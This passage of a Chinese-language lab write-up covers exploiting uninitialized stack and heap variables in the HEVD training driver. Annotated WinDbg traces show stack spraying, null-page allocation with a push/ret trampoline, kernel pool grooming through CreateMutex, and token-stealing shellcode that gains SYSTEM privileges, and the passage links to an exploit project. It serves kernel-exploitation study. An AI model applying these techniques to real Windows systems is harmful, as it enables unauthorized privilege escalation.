    kd> dd 94d139e4
    94d139e4  00c62800 00c62800 00c62800 00c62800
    94d139f4  00c62800 00c62800 00c62800 00c62800
    94d13a04  00c62800 00c62800 00c62800 00c62800
    94d13a14  00c62800 00c62800 00c62800 00c62800
    94d13a24  00c62800 00c62800 00c62800 00c62800
memcpy之后，可以看到栈地址空间被喷射上了shellcode的指针，接下来触发漏洞，关于触发的原理阅读HEVD.sys源码很清晰，这里不详细介绍，大致就是当传入的UserValue，和漏洞的MagicValue不一样的情况下，就可以引发未初始化变量。
    kd> p
    HEVD+0x2cac:
    95327cac 8b95ecfeffff    mov     edx,dword ptr [ebp-114h]
    kd> dd ebp-114
    8c1f1994  baadf00d 01342800 01342800 01342800
    8c1f19a4  01342800 01342800 01342800 01342800
    8c1f19b4  01342800 01342800 01342800 01342800
    8c1f19c4  01342800 01342800 01342800 01342800
    8c1f19d4  01342800 01342800 01342800 01342800
    8c1f19e4  01342800 01342800 01342800 01342800
    8c1f19f4  01342800 01342800 01342800 01342800
在进入HEVD的Trigger函数之后，可以看到此时内核栈已经被覆盖，这时候UserValue的值，也就是我们可控的值是baadf00d，随后看一下StackVariable结构体的内容。
    kd> p
    HEVD+0x2ccc:
    95327ccc e853d8ffff      call    HEVD+0x524 (95325524)
    kd> r eax
    eax=8c1f1998
    kd> dd 8c1f1998
    8c1f1998  01342800 01342800 01342800 01342800
    8c1f19a8  01342800 01342800 01342800 01342800
    8c1f19b8  01342800 01342800 01342800 01342800
    8c1f19c8  01342800 01342800 01342800 01342800
随后会对UserValue和MagicValue进行比较。
    kd> p
    HEVD+0x2cda:
    95327cda 3b4de0          cmp     ecx,dword ptr [ebp-20h]
    kd> p
    HEVD+0x2cdd:
    95327cdd 7516            jne     HEVD+0x2cf5 (95327cf5)
    kd> r ecx
    ecx=baadf00d
    kd> dd ebp-20
    8c1f1a88  bad0b0b0
UserValue是baadf00d，而HEVD.sys的MagicValue的值是bad0b0b0，不相等的情况下，不会对之前的StackVariable结构体中的成员变量初始化，而此时成员变量的值都被shellcode覆盖，最后引用，导致在内核态进入shellcode。
    kd> p
    HEVD+0x2d33:
    95327d33 ff95f4feffff    call    dword ptr [ebp-10Ch]
    kd> dd ebp-10c
    8c1f199c  01342800
    01342800 55              push    ebp
    01342801 8bec            mov     ebp,esp
    01342803 83e4f8          and     esp,0FFFFFFF8h
    01342806 83ec34          sub     esp,34h
    01342809 33c0            xor     eax,eax
    0134280b 56              push    esi
    0134280c 33f6            xor     esi,esi
最后在内核态执行shellcode，替换当前进程token为System token，完成提权。
### 0x03 Uninitialized Stack & Heap
最后就是关于这次challenge了，其实这个challenge非常好理解，如果做过浏览器或者其他跟堆有关漏洞的小伙伴肯定第一时间想到的就是Heap
Spray，没错，堆喷！
利用内核堆喷，我们可以完成对堆结构的控制，最后完成提权，在文章最后，我放一个我修改了UninitializedHeapVariable对应Exploit内容的项目地址，可以利用我的这个项目地址完成提权。
但是，内核堆喷和应用层的堆喷不太一样，要解决两个问题，第一个shellcode放在哪里，第二个如何在用户态向内核堆进行喷射。
解决问题的关键在于NtAllocateVirtualMemory和CreateMutex，首先NtAllocateVirtualMemory对于内核熟悉的小伙伴肯定不会陌生，看过我前面两篇内核调试学习的小伙伴也不会陌生，在很多内核漏洞利用场景中，都会用到这个函数，这个函数可以用来申请零页内存，来完成shellcode的布局。
如何布局是一个问题，这里来看一下漏洞触发位置的调用。
    92319abd 83c408          add     esp,8
    92319ac0 8b4ddc          mov     ecx,dword ptr [ebp-24h]
    92319ac3 8b5104          mov     edx,dword ptr [ecx+4]
    92319ac6 ffd2            call    edx {00460046}
如果我们能够控制edx的话，这里调用的就是刚才通过NtAllocateVirtualMemory申请的内存，这里可以直接往这里面存放shellcode，可是我从老外那学到了一种方法，就是获取shellcode的函数入口指针，然后这里存放68+addr+c3的组合，这样call调用后，执行的内容就是。
    kd> t
    00640066 68b0141401      push    11414B0h
    kd> p
    0064006b c3              ret
这样，相当于将shellcode入口指针入栈，esp变成shellcode指针，然后ret，之后就会跳转到shellcode中执行shellcode，这样对于NtAllocateVirtualMemory布局操作就简单很多。
这样，我们只需要申请一个零页空间就行了。
    kd> dd 00460046
    00460046  35278068 0000c301
布置上我们的push shellcode addr;ret
然后就是关键的CreateMutex，这个会创建互斥体，我们申请多个互斥体，完成对堆的布局。
    kd> p
    KernelBase!CreateMutexA+0x19:
    001b:75961675 e809000000      call    KernelBase!CreateMutexExA (75961683)
    kd> dd esp
    0099e73c  00000000 0099f788 00000001 001f0001
    0099e74c  0099f81c 0110320e 00000000 00000001
    0099e75c  0099f788 9c1c5b57 00000000 00000000
    0099e76c  00000000 00000000 00000000 00000000
    0099e77c  00000000 00000000 00000000 00000000
    0099e78c  00000000 00000000 00000000 00000000
    0099e79c  00000000 00000000 00000000 00000000
    0099e7ac  00000000 00000000 00000000 00000000
    kd> dc 99f788
    0099f788  46464646 67716870 656d7568 6e6c7961  FFFFphqghumeayln
    0099f798  7864666c 63726966 78637376 77626767  lfdxfircvscxggbw
    0099f7a8  716e666b 77787564 6f666e66 7273767a  kfnqduxwfnfozvsr
    0099f7b8  706a6b74 67706572 70727867 7976726e  tkjprepggxrpnrvy
    0099f7c8  776d7473 79737963 70716379 6b697665  stmwcysyycqpevik
    0099f7d8  6d666665 6d696e7a 73616b6b 72737776  effmznimkkasvwsr
    0099f7e8  6b7a6e65 66786379 736c7478 73707967  enzkycxfxtlsgyps
    0099f7f8  70646166 00656f6f 9c1c5b57 0099e760  fadpooe.W[..`...
申请多个互斥体后，可以看到对池空间的控制。可以看到，第一个参数是mutexname，这个前面必须包含46，这样才能进行函数调用后，在pool中覆盖到00460046的值。
    kd> r eax
    eax=a6630b38
    kd> !pool a6630b38
    Pool page a6630b38 region is Paged pool
     a6630000 size:  100 previous size:    0  (Allocated)  IoNm
     a6630100 size:    8 previous size:  100  (Free)       0.4.
     a6630108 size:  128 previous size:    8  (Allocated)  NtFs
     a6630230 size:    8 previous size:  128  (Free)       Sect
     a6630238 size:   18 previous size:    8  (Allocated)  Ntf0
     a6630250 size:   38 previous size:   18  (Allocated)  CMVa
     a6630288 size:   68 previous size:   38  (Allocated)  FIcs
     a66302f0 size:   f8 previous size:   68  (Allocated)  ObNm
     a66303e8 size:  138 previous size:   f8  (Allocated)  NtFs
     a6630520 size:  100 previous size:  138  (Allocated)  IoNm
     a6630620 size:  128 previous size:  100  (Free)       ObNm
     a6630748 size:   68 previous size:  128  (Allocated)  FIcs
     a66307b0 size:  380 previous size:   68  (Allocated)  Ntff
    *a6630b30 size:   f8 previous size:  380  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
这里a6630b30中包含了8字节的pool header，和0xf0的nopage pool，通过CreateMutex，我们会对kernel
pool占用。
    kd> dd a6630b38
    a6630b38  00000000 00460046 00780069 00620074
    a6630b48  0074006b 00770065 00630071 006a0078
    a6630b58  00740065 00720063 00730061 006a007a
    a6630b68  006e0065 00790070 006a0064 00680061
    a6630b78  00710067 00660072 006c007a 0079006f
    a6630b88  007a0075 0068006f 00760074 006a0078
    a6630b98  006b0063 00730073 00750064 00770077
可以看到，现在头部结构已经被00460046占用，接下来，还是由于UserValue和MagicValue的原因，引发Uninitialized Heap
Variable。
    kd> g
    Breakpoint 1 hit
    HEVD+0x299e:
    9231999e ff1598783192    call    dword ptr [HEVD+0x898 (92317898)]
    kd> p
    HEVD+0x29a4:
    923199a4 8945dc          mov     dword ptr [ebp-24h],eax
    kd> dd eax
    889f8610  00000000 00460046 00780069 00620074
    kd> dd 00460046
    00460046  35278068 0000c301
随后由于池中结构体的内容未初始化，内核池中存放的还是我们通过CreateMutex布置的内容，直接引用会跳转到我们通过NtAllocateVirtualMemory申请的空间。
    kd> p
    HEVD+0x2ac0:
    95327ac0 8b4ddc          mov     ecx,dword ptr [ebp-24h]
    kd> p
    HEVD+0x2ac3:
    95327ac3 8b5104          mov     edx,dword ptr [ecx+4]
    kd> r ecx
    ecx=a86c5580
    kd> p
    HEVD+0x2ac6:
    95327ac6 ffd2            call    edx
    kd> t
    00460046 68b0141401      push    11414B0h
    kd> p
    0064006b c3              ret
    kd> p
    011414b0 53              push    ebx
    011414b0 53              push    ebx
    011414b1 56              push    esi
    011414b2 57              push    edi
    011414b3 60              pushad
    011414b4 33c0            xor     eax,eax
    011414b6 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
    011414bd 8b4050          mov     eax,dword ptr [eax+50h]
    011414c0 8bc8            mov     ecx,eax
随后push shellcode之后，esp的值被修改，直接ret会跳转到shellcode address，执行提权。
最后我贴上更新后的项目代码。
https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Source_with_Unin_Heap_Variable_Chall
* * *